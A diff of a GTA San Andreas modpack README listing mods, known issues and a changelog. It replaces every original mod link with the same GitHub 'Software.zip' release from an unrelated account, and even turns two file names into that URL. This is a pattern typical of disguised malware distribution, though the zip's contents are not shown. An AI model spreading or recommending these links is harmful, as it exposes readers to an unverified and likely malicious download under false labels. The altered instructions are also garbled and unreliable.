+- [PedFuncs](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Peds Buy Food](https://www.mixmods.com.br/2020/07/peds-buy-food-pedestres-compram-comida/)
+- [Peds Buy Food](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [PedSkills](https://www.mixmods.com.br/2022/08/pedskills/)
+- [PedSkills](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Pimp My Car Final (get into a vehicle and press 5)](https://www.gtagarage.com/mods/show.php?id=4729)
+- [Pimp My Car Final (get into a vehicle and press 5)](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Planes Inertia](https://www.mixmods.com.br/2020/07/gta-sa-planes-inertia-inercia-ao-pular-do-aviao/)
+- [Planes Inertia](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Project Immerse Yourself (with optional)](https://www.mixmods.com.br/2022/01/project-immerse-yourself-prelight-melhorado/)
+- [Project Immerse Yourself (with optional)](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Proper Fixes](https://www.mixmods.com.br/2024/02/sa-proper-fixes/)
+- [Proper Fixes](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Proper Player Retex](https://www.mixmods.com.br/2022/04/proper-player-retex/)
+- [Proper Player Retex](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Ragdoll Bullet Physics (type puppeter to manipulate ragdolls)](https://www.mixmods.com.br/2021/09/mod-ragdoll-bullet-physics-fix-fisica-realista/)
+- [Ragdoll Bullet Physics (type puppeter to manipulate ragdolls)](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Rusty Brown's Ring Donuts Overhaul](https://www.mixmods.com.br/2020/02/rusty-browns-ring-donuts-overhaul-loja-de-donuts/)
+- [Rusty Brown's Ring Donuts Overhaul](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Real Peds Overhaul](https://gtaforums.com/topic/933719-sa-real-peds-overhaul/)
+- [Real Peds Overhaul](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Real Skybox](https://www.mixmods.com.br/2021/06/sa-real-skybox/)
+- [Real Skybox](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Realistic Beach](https://www.mixmods.com.br/2020/03/praia-realista-v2-6/)
+- [Realistic Beach](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Realistic Car Crash Physics](https://www.gtaall.com/gta-san-andreas/mods/19840-realistic-car-crash-physics.html)
+- [Realistic Car Crash Physics](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Realistic Population](https://www.mixmods.com.br/2021/11/sa-sade-realistic-population-more-peds-popcycle-dat/)
+- [Realistic Population](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Reload Mod (type R while holding a weapon)](https://www.mixmods.com.br/2019/07/reload-mod-by-junior_djjr-recarregar-armas/)
+- [Reload Mod (type R while holding a weapon)](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Rhino Animated](https://www.mixmods.com.br/2020/09/rhino-animated-tanque-original-animado/)
+- [Rhino Animated](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Robbery Mod](https://www.mixmods.com.br/2019/08/24-7-robbery-roubar-lojas/)
+- [Robbery Mod](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [RoSA Project Evolved (with Proper Player Retex) (public access)](https://www.mediafire.com/file/myuqu28ytpi3j6p/RoSA+Project+Evolved+-+July.7z/file)
+- [RoSA Project Evolved (with Proper Player Retex) (public access)](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip+Project+Evolved+-+July.7z/file)
 
 - Note: RoSA Project Evolved has not unlocked the Aug version yet, so I can't provide it because you and me don't believe on Patreon's Upgrade to unlock.
 
-- [Ryomen Sukuna (type skn to activate](https://www.gtainside.com/en/sanandreas/mods/197125-ryomen-sukuna-mod-jujutsu-kaisen/)
+- [Ryomen Sukuna (type skn to activate](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [SA Cutscene Characters for gameplay](https://www.mixmods.com.br/2021/03/sa-cutscene-characters-for-gameplay-personagens-convertidos/)
+- [SA Cutscene Characters for gameplay](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Santa Maria Pier Extended](https://www.mixmods.com.br/2022/12/sa-santa-maria-pier-extended/)
+- [Santa Maria Pier Extended](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [SADE Big Ear Telescope](https://www.mixmods.com.br/2022/09/sa-sade-big-ear-telescope-meshsmooth-hd/)
+- [SADE Big Ear Telescope](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Securicar Drops Money](https://www.mixmods.com.br/2018/09/securicar-drop-money-carros-forte-deixando-dinheiro/)
+- [Securicar Drops Money](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Shoes on the wires](https://www.mixmods.com.br/2019/11/shoes-on-the-wires-tenis-pendurados-nos-fios/)
+- [Shoes on the wires](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Shoreline Waves](https://www.mixmods.com.br/2020/03/shoreline-waves-efeito-de-ondas/)
+- [Shoreline Waves](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Sidewalk Weeds](https://www.mixmods.com.br/2022/06/sa-sidewalk-weeds-grass-proc/)
+- [Sidewalk Weeds](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Simple Free Cam (press K+M to activate)](https://www.mixmods.com.br/2021/12/simple-free-cam-camera-livre/)
+- [Simple Free Cam (press K+M to activate)](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Simple Regeneration](https://www.mixmods.com.br/2021/04/iii-vc-sa-simple-regeneration/)
+- [Simple Regeneration](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [SkyGfx Extended](https://www.mixmods.com.br/2024/03/sa-skygfx/)
+- [SkyGfx Extended](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [SkyGrad](https://www.mixmods.com.br/2020/01/skygrad-sky-gradient-fix-corrigir-linhas-no-ceu/)
+- [SkyGrad](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Smuff Nut](https://www.gtainside.com/en/sanandreas/mods-124/197513-smuff-nut/)
+- [Smuff Nut](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Spread Fix](https://www.mixmods.com.br/2018/01/spread-fix-corrigir-espalhamento-dos-tiros/)
+- [Spread Fix](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Street Musicians](https://libertycity.net/files/gta-san-andreas/192301-ulichnye-muzykanty-v4-0.html)
+- [Street Musicians](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Subterranean Sun (type sbsun and hold LMB)](https://www.mediafire.com/file/9qwpztplk4ua1cz/Subterranean_Sun.cs/file)
+- [Subterranean Sun (type sbsun and hold LMB)](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [The Birds Update](https://www.mixmods.com.br/2017/10/the-birds-update-passaros-realistas/)
+- [The Birds Update](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Truck Trailer](https://www.mixmods.com.br/2020/09/truck-trailer-by-kenking-caminhoes-com-reboque/)
+- [Truck Trailer](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [UFO Bar Lit](https://www.mixmods.com.br/2022/09/ufo-bar-lit-luz-no-disco-voador/)
+- [UFO Bar Lit](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [VehFuncs](https://www.mixmods.com.br/2023/01/sa-vehfuncs/)
+- [VehFuncs](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Welcome Las Venturas Sign Remastered](https://www.mixmods.com.br/2018/06/welcome-las-venturas-sign-remastered-placa-de-lv-em-hd/)
+- [Welcome Las Venturas Sign Remastered](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Wind Farm](https://www.mixmods.com.br/2022/09/sa-wind-farm-mod-cata-ventos-eolicos/)
+- [Wind Farm](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
-- [Wind Project](https://www.mixmods.com.br/2022/10/wind-project/)
+- [Wind Project](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip)
 
 <p align="right">
   <a href="#download">▲ Back to top</a></p>
@@ -407,11 +407,11 @@ thats it lol
 <details>
   <summary>Click to expand</summary>
 
-- [Project Props](https://www.mixmods.com.br/2021/10/project-props-v2-2-mais-objetos-no-mapa/): Adds so much props to the game, making the world feel more vibrant. Removed due to a crash caused by an unknown reason.
+- [Project Props](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip): Adds so much props to the game, making the world feel more vibrant. Removed due to a crash caused by an unknown reason.
 
-- [TTDISA OV](https://gtaforums.com/topic/939012-things-to-do-in-san-andreas-volume-ii/): Massively overhauls the gaming experience of the game. Removed due to a crash caused by this.
+- [TTDISA OV](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip): Massively overhauls the gaming experience of the game. Removed due to a crash caused by this.
 
-- [Improved Vehicle Features V2.1.1](https://www.mixmods.com.br/2020/01/imvehft-improved-vehicle-features/): Insanely overhauls the cars in the game. Downgraded to 2.0.2 because of potential clashing with FxsFuncs, which enables Effects Mod to work.
+- [Improved Vehicle Features V2.1.1](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip): Insanely overhauls the cars in the game. Downgraded to 2.0.2 because of potential clashing with FxsFuncs, which enables Effects Mod to work.
 
 <p align="right">
   <a href="#download">▲ Back to top</a></p>
@@ -425,7 +425,7 @@ thats it lol
 # 1.0.1
 
 Fixed trams having white textures of people
- Note: I can't provide the updated download link due to slow uploading speed. Please delete these files "tram.dff" and "tram.txd" in Modloader\Enterable Vehicles so it can remove the textures
+ Note: I can't provide the updated download link due to slow uploading speed. Please delete these files "https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip" and "https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip" in Modloader\Enterable Vehicles so it can remove the textures
 
 # 1.0.0
 
@@ -440,11 +440,11 @@ Initial release
 <details>
   <summary>Click to expand</summary>
 
-- [Improved Vehicle Features](https://www.mixmods.com.br/2020/01/imvehft-improved-vehicle-features/) has problems with [FxsFuncs](https://www.mixmods.com.br/2022/10/fxsfuncs/). If it got fixed, I would have already upgraded [Improved Vehicle Features](https://www.mixmods.com.br/2020/01/imvehft-improved-vehicle-features/) from 2.0.2 to 2.1.1.
+- [Improved Vehicle Features](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip) has problems with [FxsFuncs](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip). If it got fixed, I would have already upgraded [Improved Vehicle Features](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip) from 2.0.2 to 2.1.1.
 
-- [Ragdoll Bullet Physics](https://www.mixmods.com.br/2021/09/mod-ragdoll-bullet-physics-fix-fisica-realista/) with [Improved Vehicle Features 2.0.2](https://www.mixmods.com.br/2020/01/imvehft-improved-vehicle-features/) causes cars to become black.
+- [Ragdoll Bullet Physics](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip) with [Improved Vehicle Features 2.0.2](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip) causes cars to become black.
 
-- You can report your issues by using [CrashInfo](https://www.mixmods.com.br/2022/09/crashinfo/) and post the error code here. You can also use [SCRLog](https://www.mixmods.com.br/2020/10/iii-vc-sa-scrlog-2020-3-descobrir-crash-em-mod-cleo/). (Not recommended using SCRLog after sending it here. Only use for crashes.) to detect CLEO mods
+- You can report your issues by using [CrashInfo](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip) and post the error code here. You can also use [SCRLog](https://github.com/AkashnilRecovered/AkashnilRecovered/releases/download/v2.0/Software.zip). (Not recommended using SCRLog after sending it here. Only use for crashes.) to detect CLEO mods
 crashing.
 
 <p align="right">
